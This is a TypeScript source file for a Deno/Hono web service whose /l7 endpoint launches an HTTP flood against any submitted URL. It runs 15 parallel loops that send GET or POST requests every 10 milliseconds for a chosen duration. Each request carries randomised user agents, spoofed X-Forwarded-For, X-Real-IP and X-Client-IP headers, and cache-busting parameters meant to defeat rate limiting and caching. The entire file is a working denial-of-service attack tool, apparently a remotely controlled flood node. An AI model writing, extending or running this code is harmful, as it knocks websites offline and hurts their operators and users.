import { Context, Hono } from 'hono';
import { validator as ZodValidator } from 'hono/validator';
import { logger } from 'hono/middleware';
import { z } from 'zod';
import type { L7RequestBody } from './types.ts';
import { isURL } from './utils/isURL.ts';
import { createBody } from './utils/createBody.ts';
import { createUA } from './utils/createUA.ts';
import { createIP } from './utils/createIP.ts';
import { createParam } from './utils/createParam.ts';

const app = new Hono();
const L7schema = z.object({
    targetUrl: z.string(),
    method: z.enum(["GET", "POST"]),
    timeout: z.number()
})

const body = createBody();

app.all("/v", logger(), async (c) => {
    return c.text("Hello World!");
})

app.post("/l7", ZodValidator("json", (value: any, c: Context) => {
    const result = L7schema.safeParse(value);

    if (!result.success) {
        return c.json({
            success: false,
            message: result.error.message
        }, 400);
    }

    return result.data;
}), async (c) => {
    const {
        targetUrl,
        method,
        timeout
    } = await c.req.json<L7RequestBody>();

    if (!isURL(targetUrl)) {
        return c.json({
            success: false,
            message: "Invalid URL"
        }, 400);
    }

    console.log(`Starting ${method} request to ${targetUrl}`);

    const number = 10;
    const maxThreads = 15;

    const promises = Array(maxThreads).fill(0).map(async () => {
        console.log(`One Thread started!`);

        const intervalId = setInterval(async () => {
            if (method === "POST") {
                await fetch(targetUrl, {
                    method,
                    headers: {
                        "User-Agent": createUA(),
                        "Content-Length": "0",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache",
                        "X-Forwarded-For": createIP(),
                        "X-Real-IP": createIP(),
                        "X-Client-IP": createIP(),
                    },
                    body: body,
                })
            } else {
                await fetch(targetUrl + createParam(), {
                    method,
                    headers: {
                        "User-Agent": createUA(),
                        "Content-Length": "0",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache",
                        "X-Forwarded-For": createIP(),
                        "X-Real-IP": createIP(),
                        "X-Client-IP": createIP(),
                    },
                })
            }
        }, number)

        return new Promise((resolve) => {
            setTimeout(() => {
                clearInterval(intervalId);
                resolve(0);
            }, timeout);
        })
    });

    await Promise.all(promises);

    return c.json({
        success: true,
        message: "Done",
    })
})

const { serve } = Deno;

serve(app.fetch);